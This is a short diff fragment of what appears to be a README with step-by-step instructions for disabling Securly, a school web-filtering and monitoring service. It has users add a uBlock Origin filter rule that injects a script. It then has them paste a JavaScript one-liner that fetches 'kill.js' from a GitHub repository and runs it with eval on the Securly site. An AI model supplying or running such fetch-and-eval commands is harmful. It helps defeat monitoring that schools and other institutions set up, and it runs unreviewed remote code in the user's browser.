@@ -28,6 +28,7 @@ But if you dont wanna
 
 5.Now go back and click My Filters and set it to ```*##`+js(execute_script.js)``` and apply.
 ![Logo](https://jacksdamnserver.site/bypass/UnBlockOrigin/chrome5.png)
+
 6. Go to https://securly.com
 
 7.Copy this Javascript ```fetch('https://raw.githubusercontent.com/ThisJackRN/i-hate-securly/main/kill.js').then(r => r.text()).then(r => eval(r))``` 
